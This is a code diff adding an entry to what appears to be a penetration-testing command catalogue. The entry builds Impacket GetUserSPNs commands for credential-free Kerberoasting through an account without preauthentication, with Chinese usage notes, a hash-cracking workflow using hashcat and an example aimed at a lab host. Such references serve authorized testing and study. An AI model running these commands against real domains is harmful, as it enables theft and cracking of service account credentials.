@@ -28,6 +28,26 @@ export const impacketKerberosTools: Tool[] = [
         example: 'impacket-GetUserSPNs corp.local/alice:Password123 -dc-ip 10.0.0.10 -request',
       },
       {
+        id: 'getuserspns-no-preauth',
+        title: '利用 AS-REP 账户无凭据 Kerberoasting (-no-preauth)',
+        description: '用一个无需预认证的账户经 AS 换取票据执行 Kerberoasting，-usersfile 列出要 roast 的用户 (源码强制要求)，target 写 domain/',
+        build: (p) => `impacket-GetUserSPNs ${v(p.domain, 'DOMAIN')}/ -no-preauth ${v(p.username, 'ASREP_USER')} -usersfile ${v(p.fileName, 'users.txt')} -dc-ip ${v(p.dcIP, 'DC_IP')}`,
+        usage: `位置参数:
+  target            domain/ (以斜杠结尾)；该模式下不需要有效凭据，仅用于定位域名
+关键参数:
+  -no-preauth USER  指定一个无需 Kerberos 预认证 (DONT_REQUIRE_PREAUTH) 的账户，
+                    工具先以它经 AS-REQ 拿到票据，再为 usersfile 中的用户请求服务票据
+  -usersfile FILE   每行一个待 Kerberoast 的 SPN 或 sAMAccountName；
+                    注意: -no-preauth 必须配合 -usersfile (argparse 校验，缺省直接报错退出)
+  -dc-ip IP         指定域控 IP；也可用 -dc-host 指定域控主机名
+  -outputfile FILE  将哈希写入文件
+说明: 常规 Kerberoasting 需要任意有效域凭据；而当你只拿到一个 AS-REP-roastable 的
+用户名 (没有密码) 时，本模式借它完成预认证环节，实现"无凭据 Kerberoasting"。
+典型流程: GetNPUsers 扫出无需预认证用户 (如 jjones) -> 用其做 -no-preauth
+批量 roast users.txt 中的 SPN 账户 -> hashcat -m 13100 破解。`,
+        example: 'impacket-GetUserSPNs rebound.htb/ -no-preauth jjones -usersfile users.txt -dc-host 10.10.11.231',
+      },
+      {
         id: 'getuserspns-output',
         title: '导出哈希到文件',
         description: '-outputfile 将哈希写入文件供 hashcat 破解 (自动启用 -request)',
